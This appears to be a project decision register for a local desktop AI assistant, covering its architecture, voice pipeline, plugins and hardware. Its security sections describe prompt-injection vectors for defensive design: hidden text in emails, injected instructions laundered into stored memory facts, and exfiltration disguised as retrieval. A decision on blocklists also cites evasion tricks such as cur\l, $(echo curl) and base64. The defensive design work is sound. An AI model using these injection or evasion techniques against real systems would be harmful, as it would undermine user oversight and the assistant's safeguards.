# Project Panini — Decision Register

**Document Type:** Discovery — Decision Control  
**Phase:** 00 — Discovery  
**Status:** BASELINED  
**Baseline Date:** 2026-09-09  

---

## Purpose

This register is the **single source of truth** for every design decision locked during Discovery.

**Governing rule:**  
> Every requirement, specification, component, or line of code produced in later phases (BRD, FRD, HLD, LLD, Implementation) **must trace back to a decision ID in this register**. Anything that does not trace back is a **new decision** and must be added here — with rationale and date — before it can be built.

This prevents design drift and ensures the system built matches the system designed.

---

## Status Legend

| Status | Meaning |
|---|---|
| 🔒 **LOCKED** | Decided and baselined. Changing requires a formal change entry in Section 4. |
| 🔓 **OPEN** | Identified but deliberately deferred to a later phase. |
| ⚠️ **SUPERSEDED** | Replaced by a newer decision. Retained for audit trail. |

---

## 1. Product & Scope Decisions

| ID | Decision | Value | Status | Source Doc |
|---|---|---|---|---|
| **DD-001** | Project name | **Project Panini** | 🔒 LOCKED | `02_Naming_and_Identity/01_Project_Naming_Research.md` |
| **DD-002** | Assistant name / wake word | **"Hey Panini"** | 🔒 LOCKED | `02_Naming_and_Identity/01_Project_Naming_Research.md` |
| **DD-003** | Acronym | P.A.N.I.N.I. — Personal Assistant for Natural Information & Neural Interaction | 🔒 LOCKED | `02_Naming_and_Identity/01_Project_Naming_Research.md` |
| **DD-004** | Deployment model | **Local-first, single-user.** No cloud dependency for core operation. | 🔒 LOCKED | `01_Project_Charter/01_Problem_Statement_and_Vision.md` |
| **DD-005** | Build strategy | Reuse proven OSS; do not build from scratch. **Reuse is classified per component — see DD-006a.** | 🔒 LOCKED *(refined v5)* | `03_OSS_Research/01_OSS_Repository_Analysis.md` |
| **DD-006a** | Sourcing classification | Every component is classified **DEPENDENCY** (package, unmodified — preferred) · **FORK** (copied, commit SHA recorded, changes marked) · **REIMPLEMENT** (written by us) · **REFERENCE** (studied only). Security-critical components (shell, filesystem, security kernel) are **always REIMPLEMENT**. | 🔒 LOCKED *(new v5)* | `02_Solution_Design/01_Solution_Design_Document.md` §4 |
| **DD-006** | Target platform (v1) | **Windows primary.** macOS/Linux deferred. | 🔒 LOCKED | `01_Project_Charter/01_Problem_Statement_and_Vision.md` |

---

## 2. Architecture & Technology Decisions

| ID | Decision | Value | Status | Rationale | Source Doc |
|---|---|---|---|---|---|
| **DD-010** | Desktop shell framework | **Electron** (over Tauri 2 / Web-only) | 🔒 LOCKED | Weighted score 8.42 vs 6.97. Chromium WebRTC reliability, mature desktop-pet windows, Python-sidecar IPC simplicity, avoids adding Rust to a 2-language stack. | `04_Design_Decisions/01_Framework_Comparison_Analysis.md` §1 |
| **DD-011** | Frontend stack | **React + TypeScript** | 🔒 LOCKED | Framework-agnostic UI enables browser fallback during dev. | `README.md` |
| **DD-012** | Backend stack | **Python + FastAPI** | 🔒 LOCKED | All harvested AI modules (ASR/TTS/VAD/tools) are Python. FastAPI proven in Open-LLM-VTuber and Sapphire. | `03_OSS_Research/01_OSS_Repository_Analysis.md` |
| **DD-013** | Frontend ↔ Backend transport | **WebSocket** (audio/chat streaming) + **SSE** (event bus) | 🔒 LOCKED | WebSocket pattern proven in Open-LLM-VTuber; SSE event bus proven in Sapphire. | `03_OSS_Research/01_OSS_Repository_Analysis.md` |
| **DD-014** | Process model | **Electron shell spawns Python backend as sidecar** | 🔒 LOCKED | Keeps AI workload out of the UI process. | `04_Design_Decisions/01_Framework_Comparison_Analysis.md` §1 |

---

## 3. Subsystem Decisions

### 3.1 Voice Pipeline

| ID | Decision | Value | Status | Harvest Source |
|---|---|---|---|---|
| **DD-020** | Speech-to-Text (primary) | **faster-whisper — `base` model, int8, CPU inference** | 🔒 LOCKED *(revised v3 — was `small`)* | Open-LLM-VTuber `asr/`. Measured: `base` 0.75 s vs `small` 2.31 s for a 3 s utterance |
| **DD-021** | STT architecture | **Factory + interface pattern** — 7 engines swappable via config | 🔒 LOCKED | Open-LLM-VTuber `asr/asr_factory.py`, `asr_interface.py` |
| **DD-022** | Text-to-Speech (primary) | **Kokoro (`kokoro-onnx`) — CPU inference** | 🔒 LOCKED ✅ *verified* | Measured TTFA 0.31–0.70 s; RTF 0.21–0.74 |
| **DD-105** | TTS warm-up | **Model must be warmed at daemon startup** | 🔒 LOCKED *(new v3)* | Cold first call cost 1.76 s vs 0.30 s warm |
| **DD-106** | TTS chunking strategy | Sentence-split, then clause-split; synthesise ahead by ≥1 chunk. **Caps refined by DD-124.** | 🔒 LOCKED *(refined v7)* | `create_stream()` yields only 1 chunk. Chunking cut TTFA 3.32 s → 0.38 s (8.7×) |
| **DD-124** | **TTS chunk caps** | **First chunk ≤40 chars · subsequent ≤55 · hard max 60** | 🔒 LOCKED *(new v7)* | 🔵 Re-analysis of measured data found a **5.4× cost knee at ~62 chars** (0.0083 → 0.0446 s/char). The cap is a **throughput** requirement, not just a TTFA optimisation. Explains the 1.86 s starvation gap: a 95-char chunk sat above the knee |
| **DD-125** | Sentence segmentation | **Streaming state machine + abbreviation table with deferred boundary resolution** | 🔒 LOCKED *(new v7)* | `pysbd`/NLTK/spaCy all require *complete* text; we segment a live token stream. Handles "Dr.", "e.g.", "3.5", "J. R. R.", "U.S.A." |
| **DD-126** | STT vocabulary correction | **Two layers** — `initial_prompt` decoder biasing + word-boundary-anchored correction map | 🔒 LOCKED *(new v7)* | Measured 0/12 correct on "Panini". Layer 1 does the work, Layer 2 is the safety net. Word-boundary anchoring preserves genuine "Pawnee, Oklahoma" |
| **DD-023** | TTS architecture | **Factory + interface pattern** — 20+ engines swappable via config | 🔒 LOCKED | Open-LLM-VTuber `tts/tts_factory.py`, `tts_interface.py` |
| **DD-024** | Voice Activity Detection | **Silero VAD** | 🔒 LOCKED | Open-LLM-VTuber `vad/silero.py` |
| **DD-025** | Wake word engine | **OpenWakeWord** (offline, custom model support) | 🔒 LOCKED *(re-sourced v2)* | **OpenWakeWord upstream** (Apache 2.0) — *not* Sapphire |
| **DD-026** | Audio device handling | **Cross-platform device manager** | 🔒 LOCKED *(re-sourced v2)* | **Own implementation** on `sounddevice`/PyAudio — *not* Sapphire |
| **DD-027** | Voice interruption | **Supported** — user can speak over assistant response | 🔒 LOCKED | Open-LLM-VTuber |

### 3.2 Avatar

| ID | Decision | Value | Status | Harvest Source |
|---|---|---|---|---|
| **DD-030** | Avatar primary driver | **VRM 3D** (Three.js + `@pixiv/three-vrm`) | 🔒 LOCKED | Naia OS `shell/src/` |
| **DD-031** | Avatar optional driver | **Live2D** (Cubism 4/5) — ⚠️ proprietary SDK, free for individuals, paid above ¥20M JPY revenue; sample models separately licensed | 🔒 LOCKED *(caveat added v2)* | Open-LLM-VTuber `live2d_model.py` |
| **DD-032** | Avatar selection | **Config-driven** — `avatar.type: vrm \| live2d` in `panini.yaml` | 🔒 LOCKED | — |
| **DD-033** | Avatar features | Emotion blend shapes, real-time lip-sync from TTS stream, gaze tracking | 🔒 LOCKED | Naia OS |
| **DD-034** | Desktop-pet mode | **In scope** — transparent/frameless always-visible window | 🔒 LOCKED | Open-LLM-VTuber / Naia OS |
| **DD-035** | Text input | **Full parity with voice** — same pipeline, same tools, same panels. Voice and text are two input adapters onto one conversation engine. | 🔒 LOCKED *(new v4)* | Implements BR-005. Parity is cheaper than a separate path and essential for debugging/testing without a microphone |

### 3.3 LLM Layer

| ID | Decision | Value | Status | Harvest Source |
|---|---|---|---|---|
| **DD-040** | LLM architecture | **Factory pattern — provider swappable via config** | 🔒 LOCKED | Thoth `providers/` |
| **DD-041** | Default LLM backend | **Ollama (local), constrained to ≤7B params @ Q4** (e.g. Qwen 2.5 7B, Mistral 7B) — GPU-resident | 🔒 LOCKED *(amended v2)* | — |
| **DD-042** | Optional LLM backends | OpenAI, Google Gemini, Anthropic | 🔒 LOCKED | Thoth `providers/` |
| **DD-043** | LLM routing from Open-LLM-VTuber | **NOT harvested** — replaced with own abstraction | 🔒 LOCKED | `03_OSS_Research` "What We Skip" |

### 3.4 Tools & Connectors

| ID | Decision | Value | Status | Harvest Source |
|---|---|---|---|---|
| **DD-050** | Tool registry pattern | **Base class + registry** — tools self-register and are LLM-discoverable | 🔒 LOCKED | Thoth `tools/base.py`, `tools/registry.py` |
| **DD-051** | v1 connector set | Gmail, Google Calendar, Web Search, Filesystem, Shell, Browser | 🔒 LOCKED | Thoth `tools/` |
| **DD-052** | Messaging channels (Telegram/WhatsApp/Discord/Slack) | **Deferred to Phase 2** | 🔓 OPEN | `03_OSS_Research` "What We Skip" |
| **DD-053** | MCP support | **In scope** — MCP client for external tool servers | 🔒 LOCKED | Thoth `mcp_client/` |
| **DD-127** | Shell command blocklist | **None.** T2 approval showing the verbatim command is the control | 🔒 LOCKED *(new v8)* | Blocklists are trivially bypassed (`cur\l`, `$(echo curl)`, base64) and create false confidence in a boundary that does not exist |
| **DD-128** | OAuth scope minimisation | **Separate scopes per tool** — `gmail.readonly` / `gmail.send` / `gmail.modify` | 🔒 LOCKED *(new v8)* | A compromised read path cannot escalate to sending — it lacks the credential, independent of the approval gate |
| **DD-129** | Retrieved-content sanitisation | Strip scripts, styles, **hidden elements**, zero-width and bidi characters before content enters context | 🔒 LOCKED *(new v8)* | Hidden text (`display:none`, white-on-white, zero-width) is invisible to a human reviewing an email but fully visible to the model — a standard injection vector |
| **DD-130** | Tool output cap | **100 KB**, truncated with an explicit marker | 🔒 LOCKED *(new v8)* | Security control, not hygiene: unbounded output could force context eviction, dropping the system prompt's injection warning |
| **DD-131** | Search backend fallback | **Permitted** (Tavily → DuckDuckGo), unlike LLM provider fallback | 🔒 LOCKED *(new v8)* | Both are already-external services; no new data boundary is crossed. Asymmetry with FR-214 recorded deliberately so it does not look accidental |
| **DD-132** | Browser profile | **Non-persistent context**, never the user's real profile | 🔒 LOCKED *(new v8)* | The assistant must not act with the user's logged-in sessions |

### 3.5 Security

| ID | Decision | Value | Status | Harvest Source |
|---|---|---|---|---|
| **DD-060** | Permission model | **4-tier T0–T3** (Read / Write / Execute / Dangerous) | 🔒 LOCKED | Naia OS |
| **DD-061** | T0 — Read | No confirmation required | 🔒 LOCKED | Naia OS |
| **DD-062** | T1 — Write | Soft confirmation | 🔒 LOCKED | Naia OS |
| **DD-063** | T2 — Execute | Explicit approval modal | 🔒 LOCKED | Naia OS |
| **DD-064** | T3 — Dangerous | Hard approval + mandatory audit log entry | 🔒 LOCKED | Naia OS |
| **DD-065** | Audit logging | **All tool executions logged to SQLite** | 🔒 LOCKED | Naia OS |
| **DD-066** | Credential storage | Encrypted at rest, machine-bound, excluded from backups | 🔒 LOCKED | Sapphire pattern |

### 3.5b Content-Initiated Security *(added v4 — from Threat Model)*

The 4-tier model above governs **user-initiated** risk. These decisions govern **content-initiated** risk — manipulation via email, web pages, files, and other retrieved content.

| ID | Decision | Value | Status | Source |
|---|---|---|---|---|
| **DD-110** | Provenance tagging | All context tagged `USER` / `SYSTEM` / `RETRIEVED`. `RETRIEVED` is **data, never instruction**. | 🔒 LOCKED *(new v4)* | Threat Model SC-1 |
| **DD-111** | **Taint tracking** | Once `RETRIEVED` content enters a turn, **every T1+ tool requires explicit approval** for the remainder of that turn, regardless of its normal tier | 🔒 LOCKED *(new v4)* | Threat Model SC-2 — **the load-bearing control**; enforced in code, does not depend on model compliance |
| **DD-112** | Egress classification | Any tool able to transmit data off-machine is an **egress tool** regardless of tier (email send, HTTP fetch with params, writes to synced paths, webhooks, MCP). Egress while tainted always prompts, showing destination + payload preview | 🔒 LOCKED *(new v4)* | Threat Model SC-3 — defeats T-07, exfiltration disguised as retrieval |
| **DD-113** | Provider transparency | Active model provider always visible; switching local → cloud requires explicit acknowledgement | 🔒 LOCKED *(new v4)* | Threat Model SC-4. Implements BR-024 |
| **DD-133** | Viseme source | **Derived from the audio signal**, not TTS phoneme output | 🔒 LOCKED *(new v9)* | TTS is swappable (DD-023); coupling the avatar to Kokoro's internals would break on engine change |
| **DD-134** | Approval default | **Deny is default; `Enter` denies.** Approving requires a deliberate focus change | 🔒 LOCKED *(new v9)* | A reflexive keypress must be safe. Pre-focusing Approve would make accidental approval a single keystroke |
| **DD-135** | Approval visual weight | **Scales with risk.** 1.5 s enforced read delay **only** for egress + tainted + unknown destination | 🔒 LOCKED *(new v9)* | Routine confirmations must not look like dangerous ones. The delay is applied narrowly so it does not become background noise |
| **DD-136** | Allowlist addition | **Separate action after approval**, never a checkbox inside it | 🔒 LOCKED *(new v9)* | One distracted click must not both approve *and* permanently trust a destination |
| **DD-137** | Fact editing | **Editing a fact clears `origin_tainted`** | 🔒 LOCKED *(new v9)* | Once the user has read and rewritten the statement, authorship — and therefore provenance — transfers to them |
| **DD-138** | Approval fatigue instrumentation | Count + deny rate tracked per session; warning surfaced when sustained | 🔒 LOCKED *(new v9)* | T-12 is a measurable failure mode (SC-5); measure it rather than assume it away |
| **DD-114** | No blanket approvals | No "approve all" or "remember this" for T2/T3 actions | 🔒 LOCKED *(new v4)* | Threat Model SC-5 — preserves approval signal |
| **DD-115** | Credential handles | Tools receive credential **handles**, never values; secrets never enter model context | 🔒 LOCKED *(new v4)* | Threat Model SC-7 |
| **DD-139** | Audit storage | **Separate database file** (`audit.db`), not a table in `panini.db` | 🔒 LOCKED *(new v10)* | Clean deny path for the fs tool · independent durability pragma · main-DB corruption cannot damage the trail · independent rotation |
| **DD-140** | Audit durability | **`synchronous=FULL`** on audit; `NORMAL` on the main store | 🔒 LOCKED *(new v10)* | An audit entry surviving only in the page cache is worthless after a crash. Slower and correct |
| **DD-141** | Append-only enforcement | **SQLite triggers**, not application convention. `AuditStore` exposes no delete and no general update | 🔒 LOCKED *(new v10)* | Database-level guarantee. Scope is honest: defends against the assistant and a compromised tool, not an attacker with local code execution |
| **DD-142** | Audit retention | **Bounded by rotation, never pruning.** Archives are never deleted by the application | 🔒 LOCKED *(new v10)* | Deletion is impossible by trigger; removing audit history is a decision only the user makes, outside the assistant |
| **DD-143** | Corruption handling | **Corrupt `audit.db` is fatal to startup**; corrupt `panini.db` degrades gracefully | 🔒 LOCKED *(new v10)* | Running without a working audit trail would violate FR-560 |
| **DD-144** | Backup scope | **Credentials excluded** from backups | 🔒 LOCKED *(new v10)* | Machine-bound anyway (DD-066); a restored backup requiring re-authentication is intended, not a defect |
| **DD-116** | Audit log isolation | Audit log is append-only and **not reachable via the filesystem tool** | 🔒 LOCKED *(new v4)* | Threat Model SC-8 |
| **DD-120** | **Fact provenance** | Every stored fact records `origin_tainted` — whether it was extracted during a tainted turn | 🔒 LOCKED *(new v6)* | 🔴 **Closes a taint-laundering hole.** Taint is per-turn (FR-512); memory crosses turns. Without provenance, an injected instruction extracted as a "fact" re-enters a later *clean* turn as trusted background |
| **DD-121** | **Tainted-fact confirmation gate** | A fact with `origin_tainted=True` is **not loaded into context** until the user confirms it in the Memory view. Once confirmed, loading it **taints the turn** (source `memory:<id>`) | 🔒 LOCKED *(new v6)* | Two rules both required: M-1 stops silent persistence, M-2 keeps provenance permanent |
| **DD-117** | Residual injection risk | **Accepted.** Prompt-level defence is probabilistic; design assumes injection will sometimes succeed and constrains blast radius via DD-111/DD-112 | 🔒 LOCKED *(new v4)* | Threat Model §6 — conscious acceptance, not an oversight |

### 3.6 Extensibility

| ID | Decision | Value | Status | Harvest Source |
|---|---|---|---|---|
| **DD-070** | Plugin system | **Manifest-driven, signed (ed25519), hot-reloadable** | 🔒 LOCKED *(re-sourced v2)* | **Own implementation** — `importlib` + JSON manifest + `cryptography`. Sapphire = design reference only |
| **DD-150** | **Plugin isolation** | **Two classes: sandboxed (subprocess, default) and trusted (in-process, explicit opt-in)** | 🔒 LOCKED *(new v12)* | 🔴 In-process Python **cannot** enforce manifest capabilities — `import os` defeats any declaration. Without subprocess isolation, FR-603 would be a requirement the implementation cannot meet |
| **DD-151** | Sandbox mechanism | Plugins **request operations from the host** via RPC; they never act directly | 🔒 LOCKED *(new v12)* | This is what makes capabilities enforceable rather than declarative |
| **DD-152** | Plugin operation routing | Plugin operations pass through the **security kernel** — same path checks, tier escalation, egress classification, approval, audit | 🔒 LOCKED *(new v12)* | Plugins get no bypass; a plugin's file write is an ordinary `fs_write` |
| **DD-153** | Signature semantics | **A signature proves integrity, not safety** | 🔒 LOCKED *(new v12)* | No central registry; the user signs what they reviewed. Isolation limits behaviour — signing only makes tampering detectable |
| **DD-154** | `prompt_inject` constraint | Sandboxed injections are **delimited and placed after an immutable core system prompt** | 🔒 LOCKED *(new v12)* | A plugin must not be able to weaken the retrieved-content warning that DD-110 depends on |
| **DD-155** | Plugin enable/disable timing | **Turn boundary**, never mid-turn | 🔒 LOCKED *(new v12)* | Consistent with DD-146; avoids in-flight invocations referencing unregistered tools |
| **DD-156** | Trusted-mode visibility | **Persistent indicator**, not a one-time dialog | 🔒 LOCKED *(new v12)* | A reduced security boundary should stay visible |
| **DD-071** | Plugin hooks | `prompt_inject`, `ghost_inject`, `pre_chat` | 🔒 LOCKED *(re-sourced v2)* | **Own implementation.** Sapphire = design reference only |
| **DD-072** | Event bus | **Async pub/sub + SSE, 50-event replay buffer** | 🔒 LOCKED *(re-sourced v2)* | **Own implementation** — `asyncio` + FastAPI `StreamingResponse`. Sapphire = design reference only |
| **DD-073** | Persona system | **Switchable assistant personalities** | 🔒 LOCKED *(re-sourced v2)* | **Own implementation** — JSON config + prompt templating |
| **DD-074** | Sapphire code usage | **PROHIBITED — AGPL-3.0.** Design reference only; no code may be copied. | 🔒 LOCKED *(new v2)* | `03_License_Audit.md` |

### 3.7 Output Rendering

| ID | Decision | Value | Status |
|---|---|---|---|
| **DD-080** | Output strategy | **Smart panel routing** — LLM tags output content-type, UI routes to matching panel | 🔒 LOCKED |
| **DD-081** | Panel set (v1) | `CodePanel`, `ImagePanel`, `VideoPanel`, `DataPanel`, `ActionPanel`, `ChatPanel`, `DiagramPanel`, `ChartPanel` | 🔒 LOCKED |

### 3.8 Runtime

| ID | Decision | Value | Status | Harvest Source |
|---|---|---|---|---|
| **DD-090** | Always-on daemon | **Background process survives window close** | 🔒 LOCKED | Naia OS gateway pattern |
| **DD-091** | System tray | **In scope** — tray icon, quick actions | 🔒 LOCKED | Electron native |
| **DD-092** | Configuration | **Single YAML file** — `panini.yaml` | 🔒 LOCKED | Open-LLM-VTuber `conf.yaml` pattern |
| **DD-145** | **Security floor** | Settings that would weaken a control are **absent from the schema** or **clamped after load** (clamping logged). Config can reduce capability, never expand permission | 🔒 LOCKED *(new v11)* | No key exists to disable taint tracking, provenance, egress classification, audit, or T2/T3 approval. `tools.enabled` is a reduction only |
| **DD-146** | Reload tier for security settings | **Warm (turn boundary), never Hot** | 🔒 LOCKED *(new v11)* | Changing `allow_roots` mid-turn would open a TOCTOU window between a permission check and execution |
| **DD-147** | Measured constraints in schema | Validation encodes measurements — e.g. chunk caps `le=60` from the DD-124 knee | 🔒 LOCKED *(new v11)* | A value that would silently degrade behaviour is refused at load rather than discovered in production |
| **DD-148** | Validation error content | Errors state the **reason**, not only the rule | 🔒 LOCKED *(new v11)* | A constraint without a rationale gets worked around |
| **DD-149** | First-run config generation | Generated file annotates each value with its measurement and decision ID — **the config file is the documentation** | 🔒 LOCKED *(new v11)* | A user editing a value sees why it is what it is |

### 3.9 Hardware & Performance *(added v2)*

| ID | Decision | Value | Status | Source |
|---|---|---|---|---|
| **DD-095** | Target hardware baseline | i7-13650HX / 64 GB RAM / **RTX 3050 6 GB VRAM** + Intel UHD iGPU | 🔒 LOCKED ✅ *verified* | `05_Hardware_Validation_Results.md` |
| **DD-096** | Binding constraint | **6 GB VRAM** — all discrete-GPU workloads must fit within it | 🔒 LOCKED ✅ *verified* | 14B → 3.63 tok/s; empirically confirmed |
| **DD-097** | Workload placement | **STT + TTS on CPU; LLM on discrete GPU; avatar on iGPU** | 🔒 LOCKED *(relaxed v3)* | 1,287 MiB spare — CPU offload recommended, no longer forced |
| **DD-098** | VRAM budget | Avatar **0 MiB** (iGPU) · LLM ≤5.6 GB · **measured peak 4,857 MiB** | 🔒 LOCKED *(revised v3)* | `05_Hardware_Validation_Results.md` Test 5 |
| **DD-099** | Idle VRAM release | Daemon must unload the model after an idle timeout (`keep_alive: 5m`) | 🔒 LOCKED | `04_Hardware_Feasibility.md` §7 |
| **DD-101** | Renderer GPU preference | **Must explicitly prefer the integrated GPU** for WebGL/avatar rendering | 🔒 LOCKED *(new v3)* | Preserves discrete VRAM; default behaviour but not guaranteed |
| **DD-102** | Ollama layer offload | **`num_gpu` must be set explicitly** (29 for Qwen 7B) — never rely on auto-placement | 🔒 LOCKED *(new v3)* | Worth **+60 %** throughput: 22.09 → 35.26 tok/s |
| **DD-103** | Default context window | **`num_ctx: 8192`** | 🔒 LOCKED *(new v3)* | 4,857 MiB, 35.25 tok/s, 1,287 MiB headroom. 16 k also fits. |
| **DD-118** | **Conversation memory architecture** *(resolves DO-002)* | **Three tiers:** working memory (last 6 turns verbatim, ~2,500 tok) · rolling session summary (~400 tok) · **explicit fact store** (~300 tok). **No vector RAG in v1.** | 🔒 LOCKED *(new v6)* | Vector RAG rejected: retrieval noise degrades a 7B model, an embedding index is not user-auditable, and chunks compete with conversation in a ~6 k usable budget. Facts are user-visible and editable — same transparency posture as the audit log |
| **DD-119** | Fact retrieval method | **Lexical** (token overlap + recency + usage) with **light suffix stemming**, not semantic | 🔒 LOCKED *(amended v13)* | Only 3–5 facts load per turn; lexical is adequate, debuggable, and adds no model dependency. **Stemming added after live testing:** without it "authorised" / "authorises" / "authorisation" share no tokens, and a relevant fact is silently never retrieved — which for a fact of untrusted origin also means DD-121 M-2 never fires |
| **DD-122** | Emotion derivation | **Model-declared** via an inline tag, not inferred by sentiment analysis | 🔒 LOCKED *(new v6)* | No second model, no added latency; the generator already knows its intended tone. Fallback `neutral` |
| **DD-123** | Tool-call bound | **Max 10 tool calls per turn** (configurable) | 🔒 LOCKED *(new v6)* | Prevents an injected instruction driving an unbounded call loop |
| **DD-104** | Reference model | **`qwen2.5:7b-instruct-q4_K_M`** as the validated local default | 🔒 LOCKED *(new v3)* | Measured 35.26 tok/s at 100 % GPU |

---

## 4. Explicitly Out of Scope (v1)

> **ID prefix `DX-` denotes an EXCLUSION, not a design decision.** Renumbered 2026-09-09 from `DD-100–105`, which collided with the hardware decisions in §3.9. See Change Log.

| ID | Excluded | Status |
|---|---|---|
| **DX-001** | Multi-user support | 🔒 LOCKED — out of scope |
| **DX-002** | Mobile app | 🔒 LOCKED — out of scope |
| **DX-003** | Cloud hosting / SaaS | 🔒 LOCKED — out of scope (future consideration) |
| **DX-004** | Enterprise connectors (Salesforce, SAP) | 🔒 LOCKED — out of scope |
| **DX-005** | Real-time collaboration | 🔒 LOCKED — out of scope |
| **DX-006** | Public API / third-party dev access | 🔒 LOCKED — out of scope |

---

## 5. Deferred / Open Decisions

These are **knowingly unresolved** and must be decided in the phase noted. They are not drift.

| ID | Question | Decide In | Notes |
|---|---|---|---|
| **DO-001** | UI colour palette, typography, visual design system | HLD / UX phase | Brand identity partially defined in naming doc |
| ~~**DO-002**~~ | ~~Conversation memory architecture~~ | ✅ **RESOLVED 2026-09-09** | Three-tier design — see **DD-118–121**. Vector RAG explicitly rejected. |
| **DO-003** | Specific VRM model / character design | Implementation | VRoid Hub sourcing |
| **DO-004** | Local LLM model choice (Llama / Mistral / Qwen, size) | LLD | Depends on target hardware |
| **DO-005** | Packaging & installer approach | Release phase | electron-builder assumed |
| **DO-006** | Test framework selection | Testing phase | pytest + Playwright assumed |
| **DO-007** | How to handle "Panini" mis-transcribing in STT | FRD / LLD | Measured: 0/6 correct on `tiny`/`base` — rendered "Ponyny", "Ponyney", "Pawnee". Wake detection (OpenWakeWord) unaffected. Options: `initial_prompt` biasing · post-process substitution · larger model · accept. **Re-test with human voice first** — SAPI pronunciation may be confounding. |

---

## 6. Change Log

Any change to a 🔒 LOCKED decision must be recorded here with justification.

| Date | Decision ID | Change | Reason |
|---|---|---|---|
| 2026-09-09 | DD-030 / DD-031 | Avatar primary changed from Live2D → **VRM 3D**; Live2D demoted to optional | Live2D was chosen only because Open-LLM-VTuber had more stars — not a technical reason. VRM gives the Jarvis holographic aesthetic, free models on VRoid Hub, and Naia OS proves the full stack. |

### Baseline v2 — 2026-09-09 (post-audit revision)

Triggered by the License Audit (`03_License_Audit.md`) and Hardware Feasibility Analysis (`04_Hardware_Feasibility.md`).

| Date | Decision ID | Change | Reason |
|---|---|---|---|
| 2026-09-09 | **DD-074** *(new)* | Sapphire code copying **prohibited** | Sapphire is **AGPL-3.0**. Copying any code would make all of Project Panini AGPL, forcing full source disclosure and foreclosing DX-003 (future cloud/SaaS). |
| 2026-09-09 | DD-025 | Wake word re-sourced: Sapphire → **OpenWakeWord upstream** (Apache 2.0) | AGPL avoidance. Sapphire was only a thin wrapper — no capability lost. |
| 2026-09-09 | DD-026 | Audio devices re-sourced: Sapphire → **own impl. on `sounddevice`/PyAudio** | AGPL avoidance. Trivial to reimplement. |
| 2026-09-09 | DD-070–073 | Plugin system, hooks, event bus, personas → **own implementation** | AGPL avoidance. Sapphire retained as *design reference* (ideas are not copyrightable; code is). Adds ~3–5 days. |
| 2026-09-09 | DD-031 | Live2D licensing caveat recorded | Proprietary SDK; free for individuals but paid above ¥20M JPY revenue; sample models under a separate licence. Reinforces VRM-primary. |
| 2026-09-09 | DD-020 | STT constrained to **`small` + int8 + CPU** | 6 GB VRAM cannot host STT, TTS, LLM and avatar simultaneously. |
| 2026-09-09 | DD-022 | TTS constrained to **CPU inference** | Same VRAM constraint. Kokoro-82M runs acceptably on CPU. |
| 2026-09-09 | DD-041 | Local LLM constrained to **≤7B params @ Q4** | Only ~5 GB VRAM remains after avatar rendering. 8B Q4 fits but leaves no margin; 13B+ does not fit. |
| 2026-09-09 | **DD-095–099** *(new)* | Hardware baseline, VRAM budget, workload placement, idle unload | Formalises the constraints that make local-first achievable on this machine. |

### Baseline v3 — 2026-09-09 (post-measurement revision)

Triggered by empirical benchmarking (`05_Hardware_Validation_Results.md`). **Estimates in v2 were derived from published model specs; v3 replaces them with measured values.** Every metric met or exceeded its estimate.

| Date | Decision ID | Change | Evidence |
|---|---|---|---|
| 2026-09-09 | DD-096 | ✅ **Confirmed** — 6 GB is genuinely binding | 14B Q4 split 73 % CPU, collapsed to **3.63 tok/s** (~28 s for a 100-token reply) |
| 2026-09-09 | DD-030 | ✅ **Confirmed** with 86× margin | Avatar: **0.39 ms/frame** (2.3 % of 60 FPS budget) |
| 2026-09-09 | DD-098 | **Revised** — avatar VRAM reservation removed (0.6 GB → 0 MiB); LLM budget 5.0 → **5.6 GB** | WebGL runs on Intel UHD iGPU; RTX measured at **0 MiB / 0 %** during rendering |
| 2026-09-09 | DD-097 | **Relaxed** — CPU offload of STT/TTS now recommended rather than mandatory | Concurrent peak **4,857 MiB**, leaving **1,287 MiB** spare |
| 2026-09-09 | DD-041 | ✅ **Confirmed**; 8B Q4 now plausible (retest before widening) | Qwen 7B Q4: **35.26 tok/s at 100 % GPU**, 4,629 MiB |
| 2026-09-09 | **DD-101** *(new)* | Renderer must explicitly prefer the integrated GPU | iGPU selection is driver-default, **not guaranteed**; an Electron GPU flag or Windows setting could reclaim 0.6 GB |
| 2026-09-09 | **DD-102** *(new)* | `num_gpu` must be set explicitly | Ollama's auto-placement left ~1.8 GB VRAM unused at 61 % GPU. Forcing `num_gpu=29` → 100 % GPU and **+59.6 %** throughput |
| 2026-09-09 | **DD-103** *(new)* | Default `num_ctx = 8192` | 100 % GPU at 4,857 MiB / 35.25 tok/s. Throughput is flat across context sizes; KV cache ≈ **228 MiB per 4 k tokens** |
| 2026-09-09 | **DD-104** *(new)* | `qwen2.5:7b-instruct-q4_K_M` as validated local default | The only model measured end-to-end at 100 % GPU on this hardware |
| 2026-09-09 | **DD-020** | ⚠️ **STT model changed `small` → `base`** | **`small` failed the latency requirement.** Measured 2.31 s for a 3 s utterance vs a ≤1.5 s target (54 % over); estimate had predicted 1.2–1.5 s. `base` achieves 0.75 s — 3.1× faster — and `small`'s marginally better accuracy still does not transcribe "Panini" correctly. |
| 2026-09-09 | DD-022 | ✅ **Confirmed** — Kokoro on CPU viable | TTFA 0.31–0.70 s with chunking; RTF 0.21–0.74; 0 MiB VRAM |
| 2026-09-09 | **DD-105** *(new)* | TTS model must be warmed at daemon startup | Cold first call **1.76 s** to synthesise 1.07 s of audio (RTF 1.65, slower than realtime); same call warm took **0.30 s** |
| 2026-09-09 | **DD-157** *(new)* | 🔄 **Delivery changed to user-testable increments** | Five defects in Stages 1–3 **passed the test suite** and were found only by running the system — including one where a fact-retrieval miss meant DD-121 M-2 would never fire, turning a relevance bug into a security bug. Test doubles encode the author's assumptions, so a fake registry returning a `ToolSpec` could not reveal that the real path needed full schemas. User testing is now a required step in the definition of done rather than a phase that follows implementation. Stage *order* is unchanged. See `06_Implementation/01_Iterative_Delivery_Approach.md`. |
| 2026-09-09 | **DD-150–156** *(new)* | 🧩 **Plugin isolation — a requirement that could not have been met as written** | FR-603 required undeclared capabilities to be *denied at runtime*. **In-process Python cannot do that** — a loaded plugin can `import os` and reach credentials, the audit database, and the network regardless of its manifest. Shipping in-process loading while claiming enforcement would have been writing an unmeetable requirement. Resolved with subprocess isolation as the **default** (DD-150/151), plugin operations routed through the security kernel (DD-152), and trusted in-process mode as an explicit, persistently-indicated opt-in (DD-156). Also: signature semantics stated plainly — **integrity, not safety** (DD-153). |
| 2026-09-09 | **DD-145–149** *(new)* | ⚙️ **Configuration cannot disable a security control** | Writing the schema raised the question directly: could a user turn off taint tracking? **No key exists.** Taint, provenance, egress classification, audit, and T2/T3 approval are absent from the schema entirely; other values are clamped after load with the clamping logged. `tools.enabled` reduces capability only. Separately, security settings are **Warm-reload** — applying `allow_roots` mid-turn would open a TOCTOU window between a permission check and execution. |
